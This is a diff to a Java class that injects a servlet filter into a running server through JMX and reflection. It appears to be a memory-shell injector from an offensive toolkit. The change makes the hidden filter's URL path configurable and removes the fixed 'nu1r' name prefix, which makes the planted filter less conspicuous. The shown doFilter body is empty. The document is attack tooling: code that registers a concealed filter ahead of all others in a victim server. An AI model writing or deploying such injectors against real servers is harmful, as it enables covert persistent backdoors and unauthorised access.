@@ -23,10 +23,11 @@ import static org.fusesource.jansi.Ansi.ansi;
  */
 public class JFMSFromJMXF implements Filter {
 
+    public static String pattern;
+
     static {
         try {
-            String filterName = "nu1r" + System.nanoTime();
-            String urlPattern = "/nu1r";
+            String filterName = String.valueOf(System.nanoTime());
 
             JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
 
@@ -99,7 +100,7 @@ public class JFMSFromJMXF implements Filter {
                         Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                         method.setAccessible(true);
                         method.invoke(filterMapping, holder);
-                        filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
+                        filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{pattern}});
                         filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
 
                         // prependFilterMapping 会自动把 filter 加到最前面
@@ -120,7 +121,6 @@ public class JFMSFromJMXF implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-
     }
 
     @Override
